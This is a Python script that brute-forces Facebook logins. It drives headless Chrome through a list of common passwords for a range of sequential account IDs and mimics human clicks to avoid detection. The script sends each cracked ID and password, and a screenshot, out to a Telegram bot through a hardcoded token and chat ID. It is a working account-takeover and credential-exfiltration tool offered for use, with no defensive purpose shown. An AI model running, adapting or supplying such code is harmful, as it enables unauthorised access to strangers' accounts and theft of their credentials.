import time
import random
import requests
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains

# 🔑 إعدادات تليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

PASS_LIST = ['123456', '12345678', 'jasser123', 'malo123', '11223344'] # قائمة تجريبية (زدها لاحقاً)

def send_to_tg(text):
    try: requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
    except: pass

def send_photo_tg(photo_path, caption):
    try:
        with open(photo_path, 'rb') as photo:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto", 
                          data={'chat_id': CHAT_ID, 'caption': caption}, files={'photo': photo})
    except: pass

def check_account(uid, send_img=True):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--window-size=1920,1080')
    
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    actions = ActionChains(driver)
    
    try:
        for pas in PASS_LIST:
            driver.get("https://www.facebook.com")
            time.sleep(5)
            
            # إدخال البيانات
            email_field = driver.find_element(By.NAME, "email")
            pass_field = driver.find_element(By.NAME, "pass")
            
            email_field.send_keys(uid)
            time.sleep(1)
            pass_field.send_keys(pas)
            time.sleep(1)

            # --- محاكاة ضغط بشرية احترافية ---
            try:
                login_btn = driver.find_element(By.NAME, "login")
                # التحرك للزر ثم الضغط
                actions.move_to_element(login_btn).click().perform()
            except:
                # إذا فشل، نستخدم الضغط البرمجي المباشر كحل أخير
                driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
            
            time.sleep(8) # انتظار طويل للتأكد من التحميل
            
            if send_img:
                img_name = f"after_{uid}.png"
                driver.save_screenshot(img_name)
                send_photo_tg(img_name, f"📸 لقطة بعد محاولة الضغط لـ: {uid}")
                os.remove(img_name)
                send_img = False # صورة واحدة كافية للتأكد

            # التحقق من النتائج
            cookies = driver.get_cookies()
            if any(c['name'] == 'c_user' for c in cookies):
                send_to_tg(f"✅ تم الصيد بنجاح (OK)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
            elif "checkpoint" in driver.current_url:
                send_to_tg(f"⚠️ حساب مقفل (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                break
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    send_to_tg("🚀 تفعيل نظام الضغط البشري (V64).. بدأ الفحص.")
    # فحص أول حسابين للتأكد من الضغط
    ids = [str(26701173 + i) for i in range(200)]
    for i in range(2): 
        check_account(ids[i], send_img=True)
